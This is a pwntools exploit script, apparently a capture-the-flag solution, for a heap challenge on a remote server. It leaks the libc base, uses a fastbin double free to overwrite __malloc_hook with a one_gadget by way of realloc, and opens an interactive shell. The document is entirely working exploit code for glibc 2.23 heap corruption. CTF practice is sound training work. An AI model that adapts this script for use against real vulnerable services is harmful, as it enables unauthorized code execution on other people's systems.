from pwn import *

# p = process('./PoWanFa')
p = remote('challenges.hazmat.buptmerak.cn', 20133)
# attachment = ELF('./')
libc = ELF('./libc-2.23.so')

def create(size, content):
    p.sendlineafter(b'choice:', b'1')
    p.sendlineafter(b'write?', str(size).encode())
    p.sendlineafter(b'begin.', content)

def delete(index):
    p.sendlineafter(b'choice:', b'2')
    p.sendlineafter(b'delete?', str(index).encode())

def browse(index):
    p.sendlineafter(b'choice:', b'3')
    p.sendlineafter(b'see?\n', str(index).encode())

p.sendlineafter(b'choice:', b'3')
create(0x100, b'')
create(0x60, b'')
create(0x60, b'')
create(0x60, b'')
delete(0)
browse(0)
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x3c4b78
malloc_hook_addr = libc_base + libc.symbols['__malloc_hook']
realloc_addr = libc_base + libc.symbols['realloc']
print(hex(libc_base), hex(malloc_hook_addr), hex(realloc_addr))

create(0x100, b'')
delete(1)
delete(2)
delete(1)
# gdb.attach(p)
create(0x60, p64(malloc_hook_addr-35))
create(0x60, b'')
create(0x60, b'')
create(0x60, b'\x00' * 11 + p64(libc_base + 0x4527a) + p64(realloc_addr + 12))
# gdb.attach(p, 'b *Create+122')

p.sendlineafter(b'choice:', b'1')
p.sendlineafter(b'write?', str(0x60).encode())
p.interactive()